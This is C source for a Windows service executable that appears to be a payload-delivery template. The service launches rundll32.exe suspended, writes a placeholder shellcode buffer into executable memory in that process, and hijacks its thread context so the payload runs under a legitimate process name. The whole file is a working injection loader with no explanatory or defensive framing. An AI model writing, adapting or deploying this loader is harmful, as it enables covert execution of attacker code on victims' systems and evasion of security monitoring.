#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#define PAYLOAD_SIZE	8192

char cServiceName[32] = "SERVICENAME";

char bPayload[PAYLOAD_SIZE] = "PAYLOAD:";

SERVICE_STATUS ss;

SERVICE_STATUS_HANDLE hStatus = NULL;

/*
 *
 */
BOOL ServiceHandler( DWORD dwControl )
{
	if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN )
	{
		ss.dwWin32ExitCode = 0;
		ss.dwCurrentState  = SERVICE_STOPPED;
	}
	return SetServiceStatus( hStatus, &ss );
}

/*
 *
 */
VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
{
	CONTEXT Context;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID lpPayload = NULL;

	ZeroMemory( &ss, sizeof(SERVICE_STATUS) );
	ZeroMemory( &si, sizeof(STARTUPINFO) );
	ZeroMemory( &pi, sizeof(PROCESS_INFORMATION) );

	si.cb = sizeof(STARTUPINFO);

	ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;

	ss.dwCurrentState = SERVICE_START_PENDING;

	ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;

	hStatus = RegisterServiceCtrlHandler( (LPCSTR)&cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );
  
	if ( hStatus )
	{
		ss.dwCurrentState = SERVICE_RUNNING;

		SetServiceStatus( hStatus, &ss );

		if( CreateProcess( NULL, "rundll32.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) )
		{
			Context.ContextFlags = CONTEXT_FULL;
		  
			GetThreadContext( pi.hThread, &Context );
		  
			lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
			if( lpPayload )
			{
				WriteProcessMemory( pi.hProcess, lpPayload, &bPayload, PAYLOAD_SIZE, NULL );
#ifdef _WIN64
				Context.Rip = (DWORD64)lpPayload;
#else
				Context.Eip = (DWORD)lpPayload;
#endif
				SetThreadContext( pi.hThread, &Context );
			}

			ResumeThread( pi.hThread );
			
			CloseHandle( pi.hThread );
		  
			CloseHandle( pi.hProcess );
		}
		
		ServiceHandler( SERVICE_CONTROL_STOP );
		
		ExitProcess( 0 );
	}
}

/*
 *
 */
int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
{
	SERVICE_TABLE_ENTRY st[] = 
    { 
        { (LPSTR)&cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&ServiceMain }, 
        { NULL, NULL } 
    };
	return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&st );
}
